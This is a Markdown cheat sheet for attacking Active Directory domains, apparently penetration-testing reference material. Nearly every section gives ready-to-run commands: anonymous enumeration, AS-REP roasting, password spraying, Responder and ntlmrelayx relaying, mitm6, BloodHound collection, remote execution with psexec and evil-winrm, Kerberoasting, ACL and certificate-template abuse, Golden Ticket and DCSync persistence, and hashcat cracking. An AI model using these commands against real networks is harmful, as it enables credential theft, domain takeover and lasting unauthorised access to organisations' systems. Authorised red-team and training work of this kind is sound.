# 🏰 ACTIVE DIRECTORY TACTICAL GUIDE

## 1. UNAUTHENTICATED RECONNAISSANCE ---
*Initial discovery performed without valid domain credentials*

* SMB Null Session:
  `nxc smb <IP> -u '' -p '' --shares`

* LDAP Anonymous Bind:
  `nmap -n -sV --script "ldap* and not brute" -p 389 <IP>`

* RPC Enumeration:
  `rpcclient -U "" -N <IP>`

* User Enumeration (Kerbrute):
  `kerbrute userenum --dc <IP> -d <DOMAIN> users.txt`

* RID Cycling:
  `nxc smb <IP> -u 'guest' -p '' --rid-brute`


## 2. INITIAL ACCESS & HARVESTING
*Obtaining the first set of valid cleartext passwords or hashes*

* AS-REP Roasting (No Pre-Auth Required):
  `impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -format hashcat -dc-ip <IP>`
  *Hashcat Mode: 18200*

* Password Spraying:
  `nxc smb <IP> -u users.txt -p 'Spring2024!' --continue-on-success`

* Local Admin Check:
  `nxc smb <IP> -u <USER> -p <PASS> --local-auth`


## 3. RELAY ATTACKS
*Intercepting and forwarding authentication requests to compromise hosts*

* LLMNR/NetBIOS Poisoning:
  `responder -I eth0 -rdw`

* NTLM Relaying (SMB to SMB):
  `ntlmrelayx.py -tf targets.txt -smb2support`

* IPv6 DNS Takeover (mitm6):
  `mitm6 -d <DOMAIN>`
  `ntlmrelayx.py -6 -t ldaps://<DC_IP> -wh exploit-host --delegate-access`


## 4. AUTHENTICATED ENUMERATION ---
*Internal situational awareness once a standard user account is compromised*

* Host Discovery:
  `whoami`
  `ipconfig /all`
  `nltest /domain_trusts`

* Group Membership:
  `net group "Domain Admins" /domain`

* PowerShell / PowerView Enumeration:
  `Get-NetDomain`
  `Get-NetUser | select samaccountname, description`
  `Get-NetGroup -GroupName "Domain Admins"`
  `Get-NetComputer -Unconstrained`

* BloodHound Data Collection:
  *(Windows)* `SharpHound.exe -c All`
  *(Linux)* `python3 bloodhound.py -u <USER> -p <PASS> -d <DOMAIN> -dc <DC_NAME> -c All`

* Analysis Targets:
  *- Shortest Path to Domain Admin*
  *- ACL Abuse (GenericAll, WriteOwner, WriteDACL)*
  *- Kerberoastable Users*


## 5. LATERAL MOVEMENT & PIVOTING ---
*Moving from the initial foothold to other systems*

* Credential Attacks:
  *- Pass-the-Hash (PtH)*
  *- Pass-the-Ticket (PtT)*

* Remote Execution:
  `wmiexec.py <DOMAIN>/<USER>@<IP>`
  `psexec.py <DOMAIN>/<USER>@<IP>`
  `evil-winrm -i <IP> -u <USER> -p <PASS>`


## 6. DOMAIN DOMINANCE & ESCALATION ---
*Final steps to gain high-level administrative control*

* Kerberoasting (Service Accounts):
  `impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <IP> -request`
  *Hashcat Mode: 13100*

* Delegation Abuse:
  *- Unconstrained Delegation*
  *- Constrained Delegation*
  *- Resource-Based Constrained Delegation (RBCD)*

* GPO / ACL Abuse (PowerView):
  `Add-DomainObjectAcl -TargetIdentity "User01" -PrincipalIdentity "Attacker" -Rights All`
  `Set-DomainObjectOwner -Identity "DC01" -OwnerIdentity "Attacker"`


## 7. AD CS (CERTIFICATE SERVICES) EXPLOITATION ---
*Exploiting misconfigured Certificate Templates for escalation*



* Certify (Windows):
  `Certify.exe find /vulnerable`
  `Certify.exe request /ca:CA_NAME /template:VULN_TEMPLATE /altname:Administrator`

* Certipy (Linux):
  `certipy find -u <USER> -p <PASS> -dc-ip <IP> -stdout`
  `certipy auth -pfx administrator.pfx -dc-ip <IP>`


## 8. PERSISTENCE (POST-EXPLOITATION) ---
*Maintaining access after the initial breach*

* Golden Ticket (TGT):
  *- Forge a Ticket Granting Ticket using the KRBTGT hash.*
  *- Grants lifetime access as any user.*

* Silver Ticket (TGS):
  *- Forge a Service Ticket for specific services (CIFS, HOST, RPCSS).*

* Skeleton Key:
  *- Patching LSASS to allow any password for any user.*

* DCSync:
  *Mimicking a DC to pull password hashes:*
  `lsadump::dcsync /domain:<DOMAIN> /user:administrator`


## 9. CRACKING REFERENCE (HASHCAT) ---
*Cracking the hashes collected in previous phases*

* NTLM (Local/Domain Hashes):
  `hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`

* Kerberoasting (TGS-REP):
  `hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt`

* AS-REP Roasting:
  `hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt`

* DCC2 (mscash2) - Domain Cached Credentials:
  `hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt`